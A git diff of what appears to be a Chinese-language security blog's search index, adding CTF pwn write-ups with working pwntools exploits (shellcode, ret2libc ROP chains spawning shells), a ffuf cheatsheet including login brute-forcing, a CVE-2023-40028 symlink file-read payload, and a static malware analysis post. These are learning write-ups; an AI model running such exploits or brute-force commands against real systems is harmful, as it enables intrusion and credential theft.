@@ -79,145 +79,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Drop File Malware 靜態分析</title>
-    <url>/2025/01/10/Malware/</url>
-    <content><![CDATA[<h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><ul>
-<li>File Hash : d71a7b1efc4a06afffd94f526ad496368a9c4489296076449c74eec2d76ee4ca</li>
-</ul>
-<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><figcaption><span>Tools</span></figcaption><table><tr><td class="code"><pre><span class="line">Strings</span><br><span class="line">PE-Bear</span><br><span class="line">DIE (Detect It Easy)</span><br><span class="line">ResourceHacker</span><br><span class="line">IDA</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="Basic-info"><a href="#Basic-info" class="headerlink" title="Basic info"></a>Basic info</h3><h4 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h4><ul>
-<li>Grep .com<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/SkL8Jmb81e.png"
-                      alt="image"
-                ></li>
-<li>Grep dll<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/BJUZecFHyg.png"
-                      alt="image"
-                ></li>
-</ul>
-<h4 id="DIE"><a href="#DIE" class="headerlink" title="DIE"></a>DIE</h4><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/SkZy39Z81l.png"
-                      alt="image"
-                ></p>
-<ul>
-<li>AMD64 PE</li>
-<li>Develop with Vistual C&#x2F;C++</li>
-<li>Without packing</li>
-</ul>
-<h4 id="Import"><a href="#Import" class="headerlink" title="Import"></a>Import</h4><p>Kernel32.dll<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/r147djZU1l.png"
-                      alt="image"
-                ></p>
-<p>這邊可以看到跟 grep dll 的結果不太一樣，可以推測這支程式內還藏了一些東西</p>
-<h3 id="Decompile"><a href="#Decompile" class="headerlink" title="Decompile"></a>Decompile</h3><ul>
-<li><p>Entry point -&gt; <code>Optional header :: Entry Point + image base</code><br>  jmp to Entry point<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/rkJ1eobI1l.png"
-                      alt="image"
-                ><br>Security and CRT init</p>
-</li>
-<li><p>回到Function <code>main</code><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/Hk6wfoZ81l.png"
-                      alt="image"
-                ><br>會看到call 了同一個 Function 暫時命名為 load_resource</p>
-</li>
-</ul>
-<h4 id="Load-resource"><a href="#Load-resource" class="headerlink" title="Load_resource ?"></a>Load_resource ?</h4><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/BkpvQsZ81x.png"
-                      alt="image"
-                ></p>
-<p>所以這邊不是 <code>load_resource</code> 是 <code>saveResourceToPath</code> 才對<br>可以知道他從 resourcee drop 兩個 file lpName分別是</p>
-<ul>
-<li>101</li>
-<li>102</li>
-</ul>
-<h4 id="Drop-file-execution"><a href="#Drop-file-execution" class="headerlink" title="Drop file execution"></a>Drop file execution</h4><p>使用 <code>winexec</code> 執行<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/BykieYBLyx.png"
-                      alt="image"
-                ></p>
-<h2 id="What-about-Drop-File"><a href="#What-about-Drop-File" class="headerlink" title="What about Drop File"></a>What about Drop File</h2><ul>
-<li><p>原程式的 .rsrc<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/SJYz05bLkx.png"
-                      alt="image"
-                ></p>
-</li>
-<li><p>ResourceHacker Extract File<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/HJWw2FWLJx.png"
-                      alt="image"
-                ><br>這邊把 DLL and EXE 都存起來</p>
-</li>
-</ul>
-<p>check file hash 就可以知道 exe 是正常的，但 dll 可能是惡意的</p>
-<p><a class="link"   href="https://www.virustotal.com/gui/file/e6bad7f19d3e76268a09230a123bb47d6c7238b6e007cc45c6bc51bb993e8b46" >EXE<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><a class="link"   href="https://www.virustotal.com/gui/file/82a0e722f6746d6f1db58b365c0f15da135bff170d2000858d6e345712ea8732" >DLL<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Export-and-Import"><a href="#Export-and-Import" class="headerlink" title="Export and Import"></a>Export and Import</h3><ul>
-<li>DLL Export<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/rkg4BsmI1e.png"
-                      alt="image"
-                ></li>
-<li>EXE Import<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/ryjSUjX8Je.png"
-                      alt="image"
-                ></li>
-</ul>
-<p>這邊的 import 可以看到他用了 McVsocCfg.dll 的 McVsoCfgGetObject ，所以先看這個 function</p>
-<h4 id="McVsoCfgGetObject"><a href="#McVsoCfgGetObject" class="headerlink" title="McVsoCfgGetObject"></a>McVsoCfgGetObject</h4><ul>
-<li><code>unk_1800159F0</code> 做 XOR 解密<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/HkDT89WIke.png"
-                      alt="image"
-                ></li>
-</ul>
-<p>下個部分就是 VirtualAlloc and memmove 解密後的 unk_1800159F0</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/rJWY-5W81e.png"
-                      alt="image"
-                ></p>
-<ul>
-<li>VirtualAlloc : 分配 VM</li>
-<li>memmove :  將 unk_1800159F0 指向的 block copy 到 VirtualAlloc 的 block</li>
-<li>一段 XOR 解密過的資料被載入 VM</li>
-</ul>
-<p><code>unk_1800159F0 -&gt; shellcode</code></p>
-<h3 id="Conculsion"><a href="#Conculsion" class="headerlink" title="Conculsion"></a>Conculsion</h3><ul>
-<li>.rsrc 段內植入 合法的 exe 及 惡意的DLL</li>
-<li>Drop File <code>DLL side-loading</code><br>  但我們還看不出來他到底做了什麼(因為shellcode 做 XOR)，可以用動態分析看</li>
-</ul>
-<h2 id="VT"><a href="#VT" class="headerlink" title="VT"></a>VT</h2><p><a class="link"   href="https://www.virustotal.com/gui/file/d71a7b1efc4a06afffd94f526ad496368a9c4489296076449c74eec2d76ee4ca" >VT Check<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-]]></content>
-      <tags>
-        <tag>Malware</tag>
-        <tag>Research</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>威脅情資 LLM 應用</title>
     <url>/2024/11/26/RAG/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上學期自主學習因應老師要求，以 ATT&amp;CK 框架為基礎製作可以在駭客攻防課程中使用的<strong>攻擊鏈</strong>助教，最後以應用技術效率對比結尾。<br>但我覺得應該做成情資分析，例如：輸入情報分析 Technique | KillChain | Mitigations 等 ，並轉換成結構化數據，以 LLM 做 Data pre-process，也可以有更多使用方向。</p>
@@ -642,6 +503,138 @@
       </tags>
   </entry>
   <entry>
+    <title>Web fuzzer cheatsheet</title>
+    <url>/2024/11/01/ffuf/</url>
+    <content><![CDATA[<h2 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h2><blockquote>
+<p>基礎掃描</p>
+</blockquote>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://[URL]</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="FFUF"><a href="#FFUF" class="headerlink" title="FFUF"></a>FFUF</h2><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w [字典檔路徑]:[變數] -c -u [URL]</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="常用選項"><a href="#常用選項" class="headerlink" title="常用選項"></a>常用選項</h3><ul>
+<li><code>-w</code>：指定字典檔（支持多個）。</li>
+<li><code>-u</code>：目標 URL（用 FUZZ 表示測試位置）。</li>
+<li><code>-v</code>：詳細模式顯示。</li>
+<li><code>-c</code>：彩色輸出。</li>
+<li><code>-mc</code> 或 -ms：過濾或匹配 HTTP 狀態碼（如：200、403）。</li>
+<li><code>-fc</code> or <code>-fs</code>：過濾 HTTP 狀態碼或響應大小。</li>
+<li><code>-o</code>：將結果輸出至檔案（支持 json、html 等格式）。</li>
+<li><code>-e</code>：文件擴展名列表。</li>
+<li><code>-X</code>：HTTP 方法（GET、POST 等）。</li>
+<li><code>-d</code>：POST 資料。</li>
+<li><code>-H</code>：自定義 HTTP 標頭。</li>
+<li><code>-recursio</code>n：啟用遞歸（針對子目錄進行掃描）。</li>
+<li><code>-timeout</code>：請求超時設定。</li>
+</ul>
+<h3 id="用法範例"><a href="#用法範例" class="headerlink" title="用法範例"></a>用法範例</h3><ul>
+<li>目錄爆破</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>爆破檔案及副檔名</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ -e .php,.html,.txt</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>過濾特定狀態碼</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ -<span class="built_in">fc</span> 404</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>POST 請求</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/login -X POST -d <span class="string">&quot;username=FUZZ&amp;password=test&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>自定義標頭</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">複製程式碼</span><br><span class="line">ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ -H <span class="string">&quot;Authorization: Bearer TOKEN&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>遞迴爆破</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ -recursion</span><br></pre></td></tr></table></figure></div>
+
+<p>輸出結果</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ -o output.json -of json</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="篩選及匹配"><a href="#篩選及匹配" class="headerlink" title="篩選及匹配"></a>篩選及匹配</h3><ul>
+<li>匹配內容長度</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ -ml 1024</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>匹配 HTTP 狀態碼</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ -mc 200</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>過濾內容長度</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ -fl 1024</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="進階用法"><a href="#進階用法" class="headerlink" title="進階用法"></a>進階用法</h3><ul>
+<li>多變數模糊測試</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirb/users.txt:USER -w /usr/share/wordlists/dirb/passwords.txt:PASS -u https://target.com/login -d <span class="string">&quot;username=USER&amp;password=PASS&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>基於響應關鍵字過濾</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ -fr <span class="string">&quot;Not Found&quot;</span></span><br></pre></td></tr></table></figure></div>
+]]></content>
+      <tags>
+        <tag>fuzzer</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox CTF Try Out - pwn</title>
+    <url>/2024/12/10/htb-ctf/</url>
+    <content><![CDATA[<h2 id="HackTheBox-CTF-Try-Out"><a href="#HackTheBox-CTF-Try-Out" class="headerlink" title="HackTheBox CTF Try Out"></a>HackTheBox CTF Try Out</h2><p>HackTheBox 平台上的新手導向 CTF</p>
+<p><a class="link"   href="https://ctf.hackthebox.com/event/details/ctf-try-out-1434" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="Regularity"><a href="#Regularity" class="headerlink" title="Regularity"></a>Regularity</h3><p>這題的 read function 中有一個 overflow<br>因爲他什麼保護都沒開所以我們只需要把shellcode 寫進 stack 中，利用 <code>jmp rsi</code> gadget 就會跳到寫入 shellcode 的地方</p>
+<ul>
+<li>read function disassemble</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HJEwKiBNkx.png"
+                      alt="images"
+                ></p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;94.237.53.5&#x27;</span>,<span class="number">59584</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x402000</span></span><br><span class="line"></span><br><span class="line">sc =  asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        xor rax ,rax</span></span><br><span class="line"><span class="string">        mov rbx , 0x68732F6E69622F</span></span><br><span class="line"><span class="string">        push rbx</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        mov rax, 0x3b</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># or asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lea    rsi,[rsp]</span></span><br><span class="line">jmp_rsi = <span class="number">0x401041</span></span><br><span class="line"></span><br><span class="line">p = flat(sc, <span class="string">b&#x27;a&#x27;</span>* (<span class="number">0x100</span>-<span class="built_in">len</span>(sc)),jmp_rsi)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;?&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat flag.*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="為什麼是塞-0x100-不是-0x108"><a href="#為什麼是塞-0x100-不是-0x108" class="headerlink" title="為什麼是塞 0x100 不是 0x108"></a>為什麼是塞 0x100 不是 0x108</h4><p>這支程式在 function prologue&amp;Epilogue 都沒動到rbp，因為這樣所以不需要 + 0x8 蓋過 rbp</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">現代 x86-64 編譯器不修改 rbp 是合理的，尤其是函數使用 stack pointer (rsp) 來存取局部變數和函數參數，而不是使用 base pointer (rbp) 。</span><br><span class="line">現代編譯器（例如 GCC 和 Clang）在最佳化模式下會省略對 rbp 的操作，從而減少不必要的指令。</span><br><span class="line">這種方法叫做 frame pointer omission (FPO)。</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Abyss"><a href="#Abyss" class="headerlink" title="Abyss"></a>Abyss</h3><blockquote>
+<p>not yet</p>
+</blockquote>
+<h3 id="Labyrinth"><a href="#Labyrinth" class="headerlink" title="Labyrinth"></a>Labyrinth</h3><ul>
+<li>比對字串後有一個 <code>fgets</code>的 overflow 跳到 <code>escape_plan()</code> 就會輸出 flag</li>
+</ul>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;94.237.62.166&quot;</span> , <span class="number">45685</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span> +p64(<span class="number">0x401256</span>) <span class="comment"># push rbp 後面</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;69&#x27;</span>) <span class="comment"># 第一次輸入完會比對字串 ==69 ，之後還有一次輸入有 Overflow</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SJEno0BZ1g.png"
+                      alt="images"
+                ></p>
+<h3 id="Void"><a href="#Void" class="headerlink" title="Void"></a>Void</h3><blockquote>
+<p>ret2dl_resolve</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>HTB</tag>
+        <tag>CTF</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>LinkVortex | HackTheBox</title>
     <url>/2024/12/19/htb/</url>
     <content><![CDATA[<h2 id="LinkVortex"><a href="#LinkVortex" class="headerlink" title="LinkVortex"></a>LinkVortex</h2><blockquote>
@@ -737,7 +730,7 @@
                       alt="image"
                 ></a></p>
 <p><a class="link"   href="https://medium.com/@mukhammadiyev20040/linkvortex-htb-write-up-5fbc66cc0081" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h2 id="CVE-2023-40028"><a href="#CVE-2023-40028" class="headerlink" title="CVE-2023-40028"></a>CVE-2023-40028</h2><p>CVE-2023-40028 存在於 <a class="link"   href="mailto:&#71;&#104;&#111;&#x73;&#116;&#64;&#x35;&#x2e;&#53;&#x39;&#46;&#x31;" >&#71;&#104;&#111;&#x73;&#116;&#64;&#x35;&#x2e;&#53;&#x39;&#46;&#x31;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 版本之前的版本中。 該漏洞允許<strong>經過身份驗證</strong>的用戶上傳符號連結（symlink）文件，從而可能導致對主機操作系統上任意文件的讀取。</p>
+<h2 id="CVE-2023-40028"><a href="#CVE-2023-40028" class="headerlink" title="CVE-2023-40028"></a>CVE-2023-40028</h2><p>CVE-2023-40028 存在於 <a class="link"   href="mailto:&#x47;&#x68;&#111;&#115;&#116;&#x40;&#x35;&#46;&#53;&#x39;&#46;&#49;" >&#x47;&#x68;&#111;&#115;&#116;&#x40;&#x35;&#46;&#53;&#x39;&#46;&#49;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 版本之前的版本中。 該漏洞允許<strong>經過身份驗證</strong>的用戶上傳符號連結（symlink）文件，從而可能導致對主機操作系統上任意文件的讀取。</p>
 <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>genrate_exp</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">generate_exploit</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">local</span> FILE_TO_READ=<span class="variable">$1</span></span><br><span class="line">  IMAGE_NAME=$(<span class="built_in">tr</span> -dc A-Za-z0-9 &lt;/dev/urandom | <span class="built_in">head</span> -c 13; <span class="built_in">echo</span>)</span><br><span class="line">  <span class="built_in">mkdir</span> -p <span class="variable">$PAYLOAD_PATH</span>/content/images/2024/</span><br><span class="line">  <span class="built_in">ln</span> -s <span class="variable">$FILE_TO_READ</span> <span class="variable">$PAYLOAD_PATH</span>/content/images/2024/<span class="variable">$IMAGE_NAME</span>.png</span><br><span class="line">  zip -r -y <span class="variable">$PAYLOAD_ZIP_NAME</span> <span class="variable">$PAYLOAD_PATH</span>/ &amp;&gt;/dev/null</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <ul>
@@ -763,19 +756,33 @@
       </tags>
   </entry>
   <entry>
-    <title>Blog Banner</title>
-    <url>/2024/12/10/head/</url>
-    <content><![CDATA[<h2 id="Blog-summary"><a href="#Blog-summary" class="headerlink" title="Blog summary"></a>Blog summary</h2><ul>
-<li>CTF WriteUps</li>
-<li>Red Team</li>
-<li>courses</li>
-<li>Tools Cheatsheet</li>
-<li>Competition</li>
-<li>Research</li>
+    <title>NCKUCTF ret2libc2024 WriteUp</title>
+    <url>/2024/08/16/ncku-ctf-ret2libc2024-WriteUp/</url>
+    <content><![CDATA[<h2 id="ret2lbic2024"><a href="#ret2lbic2024" class="headerlink" title="ret2lbic2024"></a>ret2lbic2024</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Can you exploit buffer overflow in 2024?&quot;</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<blockquote>
+<p>能用的gadget都沒有，我們可以使用 <code>deregister_tm_clones</code> 這個 function 有個神奇的東西 (如下圖)<br>這邊就會直接幫我們把rax設為0x404040（也就是<a class="link"   href="mailto:&#x73;&#116;&#100;&#x6f;&#x75;&#x74;&#x40;&#71;&#76;&#73;&#x42;&#x43;&#95;&#50;&#46;&#50;&#46;&#x35;" >&#x73;&#116;&#100;&#x6f;&#x75;&#x74;&#x40;&#71;&#76;&#73;&#x42;&#x43;&#95;&#50;&#46;&#50;&#46;&#x35;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，call 完這個 function 後，我們只需要 call 回 main 中控制 printf 的 <code>mov rdi,rax</code> 就可以 leak 出 libc base，後面一樣用 libc 堆 rop chain 就可以了。</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/rop4-detmclone.png"
+                      alt="image"
+                ></p>
+<hr>
+<ul>
+<li>在leak的時候需要注意不能把<code>$rbp</code>寫壞，因為下次<code>gets()</code>還需要一個stack空間存東西，所以隨便找一個可寫的空間給<code>$rbp</code>跳過去後面才不會crash掉。</li>
+<li>為什麼 offset 不是用 <code>stdout@@GLIBC_2.2.5</code><br>  <code>stdout@@GLIBC_2.2.5</code> 是一個指向 <code>_IO_2_1_stdout_</code> 結構的指標，而 <code>_IO_2_1_stdout_</code> 是實際的 FILE 結構體。<br>  使用 <code>_IO_2_1_stdout_</code> 可以直接操作該結構體的memory，而不是通過指標間接訪問它。這樣可以避免偏移計算中的錯誤，也可以更精確地控制內存中的值。</li>
 </ul>
+<hr>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./chal&#x27;)</span></span><br><span class="line">r= remote(<span class="string">&#x27;140.116.246.190&#x27;</span>,<span class="number">8789</span>)</span><br><span class="line"></span><br><span class="line">l = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># printf 在設定rdi時 是用 mov rdi, rax</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">detmclone = <span class="number">0x4010d0</span> <span class="comment"># 會把rax設成 stdout</span></span><br><span class="line">mov_rdi_rax = <span class="number">0x4011c5</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404100</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>,</span><br><span class="line">    bss,</span><br><span class="line">    ret,</span><br><span class="line">    detmclone,</span><br><span class="line">    mov_rdi_rax</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;2024?&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;stdout -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.symbols[<span class="string">&#x27;stdout&#x27;</span>]))</span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x21A780</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;base address -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.address)) </span><br><span class="line"></span><br><span class="line">pop_rdi = l.address + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = l.address + <span class="number">0x2be51</span></span><br><span class="line">pop_rax = l.address + <span class="number">0x45eb0</span></span><br><span class="line">pop_rdx_rbx = l.address + <span class="number">0x90529</span></span><br><span class="line">syscall = l.address + <span class="number">0x29db4</span></span><br><span class="line">sh = l.address + <span class="number">0x1D8698</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;sh: %s&quot;</span> % <span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">p2 = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    sh,</span><br><span class="line">    pop_rax,</span><br><span class="line">    <span class="number">0x3b</span>,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    pop_rdx_rbx,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line">    ret,</span><br><span class="line">    syscall</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendline(p2)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/$(whoami)/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 ]]></content>
+      <categories>
+        <category>PWN</category>
+      </categories>
       <tags>
-        <tag>cover</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -2196,6 +2203,145 @@ Pwnable.tw</p>
       </tags>
   </entry>
   <entry>
+    <title>Drop File Malware 靜態分析</title>
+    <url>/2025/01/10/Malware/</url>
+    <content><![CDATA[<h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><ul>
+<li>File Hash : d71a7b1efc4a06afffd94f526ad496368a9c4489296076449c74eec2d76ee4ca</li>
+</ul>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><figcaption><span>Tools</span></figcaption><table><tr><td class="code"><pre><span class="line">Strings</span><br><span class="line">PE-Bear</span><br><span class="line">DIE (Detect It Easy)</span><br><span class="line">ResourceHacker</span><br><span class="line">IDA</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Basic-info"><a href="#Basic-info" class="headerlink" title="Basic info"></a>Basic info</h3><h4 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h4><ul>
+<li>Grep .com<br><img  
+                     lazyload
